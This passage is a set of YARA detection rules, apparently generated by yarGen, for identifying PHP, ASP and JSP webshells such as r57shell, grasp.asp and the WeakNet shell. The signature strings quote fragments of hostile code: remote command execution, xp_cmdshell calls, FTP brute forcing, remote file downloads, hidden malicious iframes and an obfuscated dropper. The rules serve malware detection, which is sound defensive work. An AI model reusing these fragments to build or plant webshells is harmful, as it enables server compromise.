      $s6 = " $filedump=fread($file,filesize($_POST['fname']));" fullword ascii
      $s7 = " $dump=down_tb($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);" fullword ascii
      $s8 = "  $res=run_sql($_POST['sql'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);" fullword ascii
      $s9 = "  $s=\"Dump of \".$_POST['tablename'];" fullword ascii
      $s10 = "  $s=\"Dump in \".$dfilename.\" from \".$_POST['tablename'].\":\";" fullword ascii
      $s11 = "$port[49] = \"TACACS, Login Host Protocol\";" fullword ascii
      $s12 = "################## EXECUTE #####################################################" fullword ascii
      $s13 = "$port[513] = \"who, rlogin\";" fullword ascii
      $s14 = "$port[543] = \"KLogin, AppleShare over IP\";" fullword ascii
      $s15 = "$port[3] = \"Compression Process\";" fullword ascii
      $s16 = "$port[23456] = \"EvilFTP\";" fullword ascii
      $s17 = "  $res=show_tables($_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);" fullword ascii
      $s18 = "  header(\"Content-disposition: attachment; filename=\\\"\".$_POST['tablename'].\".dmp\\\";\");" fullword ascii
      $s19 = "   $res=dump_table($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);" fullword ascii
      $s20 = "function dump_table($tab, $db,$host, $username, $pass)  //" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_20220213_04 {
   meta:
      description = "webshell - file 20220213_04.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e6dfe0c3398a3804830c070d01a2cae25dec1682068d7b7d90184e53dfadca8b"
   strings:
      $s1 = "if(@$_COOKIE['path'] != \"\"){file_put_contents($_COOKIE['path'], base64_decode(file_get_contents(base64_decode(\"L3RtcC90bXA0RT" ascii
      $s2 = "if(@$_COOKIE['path'] != \"\"){file_put_contents($_COOKIE['path'], base64_decode(file_get_contents(base64_decode(\"L3RtcC90bXA0RT" ascii
      $s3 = "nRtcA==\"))));}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule adminer_4_2_4 {
   meta:
      description = "webshell - file adminer-4.2.4.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bbbf3709995e0cb8924bc07e857042afdf5a294620c32e12136805ed6bb8735b"
   strings:
      $x1 = "as$x=>$X){if($x!=\"\"&&$X>1){echo($Kc?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$x%\").\"'>\".h($x).\"</a>\";$Kc=" ascii
      $x2 = "as$_d=>$X){if($X[0]<$ih)unset($zd[$_d]);}}$yd=&$zd[$b->bruteForceKey()];if(!$yd)$yd=array($ih+30*60,0);$yd[1]++;$wg=serialize($z" ascii
      $x3 = "as$m=>$S){$gg=h(ME).\"db=\".urlencode($m);echo\"<tr\".odd().\">\".(support(\"database\")?\"<td>\".checkbox(\"db[]\",$m,in_array(" ascii
      $x4 = "connect_error(){global$b,$h,$T,$n,$Xb;if(DB!=\"\"){header(\"HTTP/1.1 404 Not Found\");page_header(lang(35).\": \".h(DB),lang(101" ascii
      $x5 = "as$V=>$G){if($G!==null){if($Kc){echo\"<p id='logins' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";$Kc=" ascii
      $x6 = "password_file($j){$Ic=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Ic);if($J||!$j)return$J;$Sc=@fopen($Ic,\"w\");if($S" ascii
      $x7 = "password_file($j){$Ic=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Ic);if($J||!$j)return$J;$Sc=@fopen($Ic,\"w\");if($S" ascii
      $x8 = "\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privileges\"])||isse" ascii
      $x9 = "doc_link($rf){global$w,$h;$Mh=array('sql'=>\"http://dev.mysql.com/doc/refman/\".substr($h->server_info,0,3).\"/en/\",'sqlite'=>" ascii
      $x10 = "as$X){if($X[1]!=\"USAGE\")$Wc[\"$B[2]$X[2]\"][$X[1]]=true;if(preg_match('~ WITH GRANT OPTION~',$K[0]))$Wc[\"$B[2]$X[2]\"][\"GRAN" ascii
      $x11 = "';}elseif(isset($_GET[\"dump\"])){$a=$_GET[\"dump\"];if($_POST&&!$n){$_b=\"\";foreach(array(\"output\",\"format\",\"db_style\"," ascii
      $x12 = "add_invalid_login(){global$b;$Ic=get_temp_dir().\"/adminer.invalid\";$Sc=@fopen($Ic,\"r+\");if(!$Sc){$Sc=@fopen($Ic,\"w\");if(!$" ascii
      $x13 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $x14 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s15 = "';}elseif(isset($_GET[\"user\"])){$ha=$_GET[\"user\"];$Gf=array(\"\"=>array(\"All privileges\"=>\"\"));foreach(get_rows(\"SHOW P" ascii
      $s16 = "as$C=>$U){$Xh=($U!==null&&!preg_match('~table~i',$U));echo'<tr'.odd().'><td>'.checkbox(($Xh?\"views[]\":\"tables[]\"),$C,in_arra" ascii
      $s17 = "as$Tg=>$o)$Oc[str_replace(\"`\",\"``\",$Tg).\"`\".str_replace(\"`\",\"``\",$o[\"field\"])]=$Tg;$cf=array();$R=array();if($a!=\"" ascii
      $s18 = "as$x=>$X){if(in_array(idf_escape($x),$M))unset($Hh[$x]);}if($_POST[\"export\"]){cookie(\"adminer_import\",\"output=\".urlencode(" ascii
      $s19 = "processInput($o,$Y,$r=\"\"){if($r==\"SQL\")return$Y;$C=$o[\"field\"];$J=q($Y);if(preg_match('~^(now|getdate|uuid)$~',$r))$J=\"$r" ascii
      $s20 = "connect($N,$V,$G){global$b;$m=$b->database();set_error_handler(array($this,'_error'));$this->_string=\"host='\".str_replace(\":" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule webshell_php_fbi {
   meta:
      description = "webshell - file fbi.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bd65b84162530f62ea657288eb982eb12b18af8fdd9e3f71c536f626e6a261b3"
   strings:
      $x1 = "as$v=>$W){if($v!=\"\"&&$W>1){echo($gc?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$v%\").\"'>\".h($v).\"</a>\";$gc=" ascii
      $x2 = ".','Tipi definiti dall\\'utente','Numeri','Data e ora','Stringhe','Binari','Rete','Geometria','Liste','Sistema','Server','Utente" ascii
      $x3 = "as$v=>$C){if(isset($Vc[$v])){$ca=$v;break;}$v=preg_replace('~-.*~','',$v);if(!isset($pa[$v])&&isset($Vc[$v])){$ca=$v;break;}}}sw" ascii
      $x4 = "as$j){$Se=h(ME).\"db=\".urlencode($j);echo\"<tr\".odd().\"><td>\".checkbox(\"db[]\",$j,in_array($j,(array)$_POST[\"db\"])),\"<th" ascii
      $x5 = "base64_decode(\"AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AAAA/wBhTgAAAAAAAAAA" ascii
      $x6 = "as$W){if($W[1]!=\"USAGE\")$tc[\"$z[2]$W[2]\"][$W[1]]=true;if(ereg(' WITH GRANT OPTION',$G[0]))$tc[\"$z[2]$W[2]\"][\"GRANT OPTION" ascii
      $x7 = "script=document.createElement('script');script.src=jushRoot+'jush.js';script.onload=function(){if(window.jush){jush.create_links" ascii
      $x8 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geometrie','Lijsten','Databasesysteem','Server','Ge" ascii
      $x9 = "as$_=>$S){$og=($S!==null&&!eregi(\"table\",$S));echo'<tr'.odd().'><td>'.checkbox(($og?\"views[]\":\"tables[]\"),$_,in_array($_,$" ascii
      $x10 = "2;}elseif(is_object($E)){$Wd=select($E,$h);if(!$_POST[\"only_errors\"]){echo\"<form action='' method='post'>\\n\",\"<p>\".($E->n" ascii
      $x11 = "long2str($V,true);}$g='';$Q=$_SESSION[\"token\"];if(!$_SESSION[\"token\"])$_SESSION[\"token\"]=rand(1,1e6);$pe=array();if($_COOK" ascii
      $x12 = "dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privileges\"])||isset($_GET[\"user\"])||isset" ascii
      $x13 = "';echo\"<table cellspacing='0'>\\n\",\"<thead><tr><th colspan='2'><a href='http://dev.mysql.com/doc/refman/\".substr($g->server_" ascii
      $x14 = "';}elseif(isset($_GET[\"dump\"])){$a=$_GET[\"dump\"];if($_POST){$eb=\"\";foreach(array(\"output\",\"format\",\"db_style\",\"rout" ascii
      $x15 = "as$v=>$W){$v=bracket_escape($v,1);$K[]=idf_escape($v).\" = \".(ereg('char|text',$m[$v][\"type\"])||$W!=\"\"?$b->processInput($m[" ascii
      $x16 = "processInput($l,$X,$o=\"\"){if($o==\"=\")return$X;$_=$l[\"field\"];$F=($l[\"type\"]==\"bit\"&&ereg(\"^([0-9]+|b'[0-1]+')\\$\",$X" ascii
      $s17 = "c,1).\")\";$D=implode(\" UNION ALL \",$ag);}$b->dumpData($a,\"table\",$D);exit;}if(!$b->selectEmailProcess($Z,$kc)){if($_POST[\"" ascii
      $s18 = ",'SQL command','open','save','Alter database','Alter schema','Create schema','Database schema','Privileges','Dump','Logout','dat" ascii
      $s19 = "';}elseif(isset($_GET[\"user\"])){$ha=$_GET[\"user\"];$Be=array(\"\"=>array(\"All privileges\"=>\"\"));foreach(get_rows(\"SHOW P" ascii
      $s20 = "as$v=>$W){if(in_array(idf_escape($v),$I))unset($eg[$v]);}if($_POST[\"export\"]){cookie(\"adminer_import\",\"output=\".urlencode(" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule webshell_asp_grasp {
   meta:
      description = "webshell - file grasp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5767c1bb1b6d4391d8536b2c0736820fee8f7f1b0017c754a6ee7deccbc693b4"
   strings:
      $x1 = "Set Pipe = WShell.Exec(\"%comspec% /c \" & sCommand & \" 2>&1\")" fullword ascii
      $x2 = "RetCode = WShell.Run(\"%comspec% /c \" & sCommand & \" 2>&1\", 0, False)" fullword ascii
      $s3 = "' Executes command and passes stdout to browser." fullword ascii
      $s4 = "Private Sub ExecuteCmd(ByVal sCommand, ByVal bBg)" fullword ascii
      $s5 = "document.download.DL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + file_name;" fullword ascii
      $s6 = "      \"Enter the password: <form  name='download' action='\" & sURL & \"' method='POST'>\"  & _" fullword ascii
      $s7 = "document.download.DL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + '\\\\' + file_name;" fullword ascii
      $s8 = "' Shell: command" fullword ascii
      $s9 = "document.path.DIR.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + dir_name;" fullword ascii
      $s10 = "document.items.DEL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + '\\\\' + item_name;" fullword ascii
      $s11 = "document.items.DEL.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + item_name;" fullword ascii
      $s12 = "document.path.DIR.value = '<%= Replace(GetCorrectPath(sDir), \"\\\", \"\\\\\") %>' + '\\\\' + dir_name;" fullword ascii
      $s13 = "<tr><td>PROCESSOR_VERSION</td><td><%= EmptyToNbsp(WEnv(\"PROCESSOR_VERSION\")) %></td></tr>" fullword ascii
      $s14 = "' Process script args:" fullword ascii
      $s15 = "<tr><td>PROCESSOR_IDENTIFIER</td><td><%= EmptyToNbsp(WEnv(\"PROCESSOR_IDENTIFIER\")) %></td></tr>" fullword ascii
      $s16 = "<b>Shell command:</b>" fullword ascii
      $s17 = "Server.ScriptTimeout  =  360 " fullword ascii
      $s18 = "Call ExecuteCmd(sCmd, bBgMode)" fullword ascii
      $s19 = "GetFirstWord = \"[ Shell ]\"" fullword ascii
      $s20 = "Response.Write(\"Error: Content-Type is not defined.\")" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule r57shell {
   meta:
      description = "webshell - file r57shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s5 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $s6 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s9 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s10 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s11 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s12 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s13 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s14 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s15 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s16 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
      $s18 = "tp_password']):(\"billy@microsoft.com\"))));" fullword ascii
      $s19 = " $_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii
      $s20 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule SnIpEr_SA_Shell {
   meta:
      description = "webshell - file SnIpEr_SA Shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s5 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s6 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s7 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s8 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii
      $s9 = "echo '</table>'.$table_up3.\"</div></div><div align=center id='n'><font face=tahoma size=-2><b>o---[ SnIpEr_SA Shell  | <a href=" ascii
      $s10 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s11 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s12 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s13 = "     @mssql_query(\"insert into SnIpEr_SA_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s14 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s15 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }" fullword ascii
      $s16 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
      $s18 = "tp_password']):(\"billy@microsoft.com\"))));" fullword ascii
      $s19 = " $_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii
      $s20 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule _Asp {
   meta:
      description = "webshell - file -Asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "480b8dd9f3b52a17aa546f6b30557bb40672605e689b84beea67c09b00a60ec9"
   strings:
      $s1 = "<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>" fullword ascii
      $s2 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
      $s3 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
      $s4 = "a:link {" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "a:visited {" fullword ascii
      $s6 = "font-family: \"" fullword ascii
      $s7 = "<%#@~^GgAAAA==~K4%;W!xYwk^nRqDrY" fullword ascii
      $s8 = "x[,k6PZgIAAA==^#~@%>" fullword ascii
      $s9 = "PW[mYl,XQkAAA==^#~@%>" fullword ascii
      $s10 = "P1AQAAA==^#~@%>" fullword ascii
      $s11 = "<%#@~^QAAAAA==~U+O,W(LsUr,xPU+.\\" fullword ascii
      $s12 = "'BEvvPs+DtGNx2K/O@*r~lRAAAA==^#~@%>" fullword ascii
      $s13 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
      $s14 = "@*rPIxAAAA==^#~@%>" fullword ascii
      $s15 = "color: #00CC00;" fullword ascii
      $s16 = "<%#@~^FgAAAA==~Kx~" fullword ascii
      $s17 = "PqgwAAA==^#~@%>" fullword ascii
      $s18 = "<%#@~^FAAAAA==~K4%;W!xYwk^nR;VG/" fullword ascii
      $s19 = "PE@!J0G.s@*J,qQgAAA==^#~@%>" fullword ascii
      $s20 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 10KB and
      8 of them
}

rule webshell_asp_asp {
   meta:
      description = "webshell - file asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3dbe68406df840d46857ef9d7a5e0352d6c38ba08fd9ccdf39e0b39e78904412"
   strings:
      $s1 = "<iframe src=http://cpc-gov.cn/a/a/a.asp width=0 height=0></iframe>" fullword ascii
      $s2 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
      $s3 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
      $s4 = "a:link {" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "a:visited {" fullword ascii
      $s6 = "font-family: \"" fullword ascii
      $s7 = "<%#@~^GgAAAA==~K4%;W!xYwk^nRqDrY" fullword ascii
      $s8 = "x[,k6PZgIAAA==^#~@%>" fullword ascii
      $s9 = "PW[mYl,XQkAAA==^#~@%>" fullword ascii
      $s10 = "P1AQAAA==^#~@%>" fullword ascii
      $s11 = "<%#@~^QAAAAA==~U+O,W(LsUr,xPU+.\\" fullword ascii
      $s12 = "'BEvvPs+DtGNx2K/O@*r~lRAAAA==^#~@%>" fullword ascii
      $s13 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
      $s14 = "@*rPIxAAAA==^#~@%>" fullword ascii
      $s15 = "color: #00CC00;" fullword ascii
      $s16 = "<%#@~^FgAAAA==~Kx~" fullword ascii
      $s17 = "PqgwAAA==^#~@%>" fullword ascii
      $s18 = "<%#@~^FAAAAA==~K4%;W!xYwk^nR;VG/" fullword ascii
      $s19 = "PE@!J0G.s@*J,qQgAAA==^#~@%>" fullword ascii
      $s20 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 10KB and
      8 of them
}

rule SJavaWebManageV1_4 {
   meta:
      description = "webshell - file SJavaWebManageV1.4.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
   strings:
      $s1 = "p = Runtime.getRuntime().exec(cmds);" fullword ascii
      $s2 = "<form action=\"<%=shellPath %>?m=Login&do=DoLogin\" method=\"post\"" fullword ascii
      $s3 = "Object o = dbo.execute(runmysql);" fullword ascii
      $s4 = "Object obj=dbo.execute(runmysql);" fullword ascii
      $s5 = "192.168.11.11 |Java WebManage coded by shack2" fullword ascii
      $s6 = "result=Util.execCmd(cmd,encode);" fullword ascii
      $s7 = "response.sendRedirect(shellPath+\"?m=Login&info=false\");" fullword ascii
      $s8 = "href=\"javascript:post('<%=shellPath%>',{m:'CMDS'})\" name=\"CMDS\">" fullword ascii
      $s9 = "public static String execCmd(String cmd,String encode){" fullword ascii
      $s10 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+ppath+\"'});</script>\");" fullword ascii
      $s11 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+path+\"'});</script>\");" fullword ascii
      $s12 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+toPath+\"'});</script>\");" fullword ascii
      $s13 = "response.sendRedirect(shellPath+\"?m=Login\");" fullword ascii
      $s14 = "String isLogin=session.getAttribute(\"isLogin\")+\"\";" fullword ascii
      $s15 = "UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader(\"Content-Length\")),path);" fullword ascii
      $s16 = "public static int getRequestIntVal(HttpServletRequest request,String key){" fullword ascii
      $s17 = "session.setAttribute(\"isLogin\", \"true\");" fullword ascii
      $s18 = "public static String getRequestStringVal(HttpServletRequest request,String key){" fullword ascii
      $s19 = "private static final String checkNewVersion = \"http://www.shack2.org/soft/javamanage/Getnewversion.jsp\";//" fullword ascii
      $s20 = "public Connection getConn(){" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule wpes_v0_2 {
   meta:
      description = "webshell - file wpes-v0.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39e85439c4985c929153bf2896a69464a4a7dcf0f7c94701d470f3269df71bf2"
   strings:
      $x1 = "<tr><td>Software</td><td><?php echo \"<a target=\\\"blank\\\" title=\\\"Check for exploits for this software using Exploit-DB." ascii
      $x2 = "<tr><td>Hostname</td><td><?php echo \"<a target=\\\"blank\\\" href=\\\"https://www.google.com/?gws_rd=ssl#q=site:\".$_SERVER['SE" ascii
      $x3 = "<tr><td>Hostname</td><td><?php echo \"<a target=\\\"blank\\\" href=\\\"https://www.google.com/?gws_rd=ssl#q=site:\".$_SERVER['SE" ascii
      $x4 = "WeakNet PHP Execution Shell - Post-exploitation shell for convenience" fullword ascii
      $s5 = "document.getElementById(\"inputCmd\").value='ls -l ' + path + file; // TODO change to while read foo do echo foo" fullword ascii
      $s6 = "$output = \"WeakNet Post-Exploitation PHP Execution Shell is free, redistributable software. It has no warranty for the program," ascii
      $s7 = "\"https://www.exploit-db.com/search/?action=search&description=\".$software.\"&e_author=\\\">\".$_SERVER['SERVER_SOFTWARE'].\"</" ascii
      $s8 = "$output = \"WeakNet Post-Exploitation PHP Execution Shell is free, redistributable software. It has no warranty for the program," ascii
      $s9 = "passthru(\"$cmd 2>/dev/stdout\",$results); # use passthru for command execution/injection" fullword ascii
      $s10 = "<title>Weakerthan PHP Exec Shell - 2015 WeakNet Labs</title>" fullword ascii
      $s11 = "<a href=\"http://php.net/manual/en/function.system.php\">system()</a><input onClick=\"execType('system')\" <?php if($_POST['exec" ascii
      $s12 = "<a href=\"http://php.net/manual/en/function.exec.php\">exec()</a><input type=\"radio\" <?php if(!$_POST['execType']){echo \"chec" ascii
      $s13 = "<input id=\"inputCmd\" type=\"text\" size=\"55\" placeholder=\"Type command here to execute on host and hit return\" name=\"cmd" ascii
      $s14 = "<a href=\"http://php.net/manual/en/function.exec.php\">exec()</a><input type=\"radio\" <?php if(!$_POST['execType']){echo \"chec" ascii
      $s15 = "<a href=\"http://php.net/manual/en/function.system.php\">system()</a><input onClick=\"execType('system')\" <?php if($_POST['exec" ascii
      $s16 = "exec(\"$cmd 2>/dev/stdout\",$results); # a command, let's execute it on the host" fullword ascii
      $s17 = "<a href=\"http://php.net/manual/en/function.passthru.php\">passthru()</a><input onClick=\"execType('passthru')\" <?php if($_POST" ascii
      $s18 = "<a href=\"http://php.net/manual/en/function.passthru.php\">passthru()</a><input onClick=\"execType('passthru')\" <?php if($_POST" ascii
      $s19 = "</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->" fullword ascii
      $s20 = "2015 - Written by Douglas WeakNetLabs@Gmail.com" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_other {
   meta:
      description = "webshell - file other.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "451a93dcb057d97a341619b55fdd14eb75b0b79468860d1e7c8a575f649031b8"
   strings:
      $x1 = "<? Echo (gzuncompress(base64_decode('eF5MmseutFyWpud9FaW/S8pWUd0QEDi1eoD33qOUUtjAe3/1zVdZgxwgDuxNxDZrvet5D/Hvyb5V/5iSdf23//dvfyE" ascii
      $s2 = "SlFD9cx/lpCbGeTsYKb7hUKJ5gi4QdKXmxTUi2EzvfFvuQVN7AKaIjmbwyGiBI5E7kSAMHzHpaky7DSCYqXn9iqcOzmfEOyXCR4wLu76Z6uI4KQA8EqM53cF+rpd9x9m" ascii
      $s3 = "S2e7XVLviAoc1G0dBA3sJpoRBLIzw+ixPBG+U64e88DBs8/Eh1geTD9HA+3pRpbxHsh0ZnJ8oNU0Wl+UXHBwQMYCBcKaw8yZb8EJjWcSIB7/IZWLvJ6iVbJEtFvYXaQc" ascii
      $s4 = "xb8P3kpZCDcOpW950fnoimlen96i8cY/UFZc3Tkr2Gx+QDLlKciGxv70vrzb6u+cz19/zQGGu4s4YXc0Bz0aVh1lKPGXTDASpPGwGOBiFLmfEGVHl49jfVp4zrgoLX7k" ascii
